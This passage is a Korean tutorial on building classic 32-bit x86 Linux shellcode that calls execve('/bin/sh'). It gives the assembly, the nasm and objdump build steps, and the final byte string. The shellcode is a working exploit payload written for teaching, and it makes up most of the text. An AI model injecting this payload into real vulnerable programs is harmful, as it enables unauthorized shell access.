셸코드 :
    eip 레지스터 값을 바꿔 원하는 주소의 기계어 코드를 실행할 수 있게 되었습니다.

    공격자가 /bin/sh 혹은 셸 바이너리를 실행하는 기계어 코드를 실행한다면, 셸에서 제공하는 여러 명령어들을 실행할 수 있게 됩니다.

    example1 바이너리에서 /bin/sh 바이너리를 실행시키는 기계어 코드를 만들어 보겠습니다.

    리눅스에서는 바이너리를 실행시키기 위해서 execve 시스템 콜을 사용합니다.

    execve 시스템 콜의 인자는 다음과 같습니다.
    ex)
        execve syscall
        syscall number(eax register) - 0xb(11)
        1st argument(ebx register) – pathname
        2nd argument(ecx register) – argv[]
        3rd argument(edx register) – envp[]

    pathname에는 실행시킬 바이너리의 경로, 
    argv는 프로그램의 인자 포인터 배열, 
    envp에는 프로그램의 환경변수 포인터 배열이 요구됩니다.

    단순히 /bin/sh 바이너리를 실행시키는 것이 목적이기 때문에 최종적으로는 다음 인자 형태의 execve 시스템 콜을 호출하면 됩니다.
    ex)
        sys_execve("/bin/sh" 주소, NULL, NULL)

    그럼 sys_execve("/bin/sh" 주소, NULL, NULL)를 호출하는 기계어 코드를 만들어 보겠습니다.

    먼저, sys_execve("/bin/sh" 주소, NULL, NULL)를 실행하는 어셈블리 코드를 만듭니다.

    다음으로, 만들어진 어셈블리 코드를 기계어 코드로 바꿉니다.

    이 기계어 코드는 x86 리눅스 아키텍처의 어느 바이너리에서 실행시켜도 항상 /bin/sh 바이너리를 실행시키는 기능을 하고, 이를 셸코드라고 부릅니다.

    ex) 어셈블리 코드 - shellcode.asm
        section .text
        global _start
        
        _start
        xor    eax, eax
        push   eax
        push   0x68732f2f
        push   0x6e69622f ; /bin/sh 문자열을 스택에 저장합니다.
        mov    ebx, esp
        xor    ecx, ecx
        xor    edx, edx
        mov    al, 0xb
        int    0x80

    ex) 어셈블리 코드를 기계어로 변환 - shellcode.o
        $ sudo apt-get install nasm     # nasm을 설치합니다.
        $ nasm -f elf shellcode.asm
        $ objdump -d shellcode.o
        
        shellcode.o:     file format elf32-i386
       
        Disassembly of section .text:
       
        00000000 <_start>:
            0:	31 c0                	xor    %eax,%eax
            2:	50                   	push   %eax
            3:	68 2f 2f 73 68       	push   $0x68732f2f
            8:	68 2f 62 69 6e       	push   $0x6e69622f
            d:	89 e3                	mov    %esp,%ebx
            f:	31 c9                	xor    %ecx,%ecx
            11:	31 d2                	xor    %edx,%edx
            13:	b0 0b                	mov    $0xb,%al
            15:	cd 80                	int    $0x80
        $ 

    ex) 기계어 코드 - shellcode.bin
        $ objcopy --dump-section .text=shellcode.bin shellcode.o
        $ xxd shellcode.bin
        00000000: 31c0 5068 2f2f 7368 682f 6269 6e89 e331  1.Ph//shh/bin..1
        00000010: c931 d2b0 0bcd 80                        .1.....
        $ 

        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"























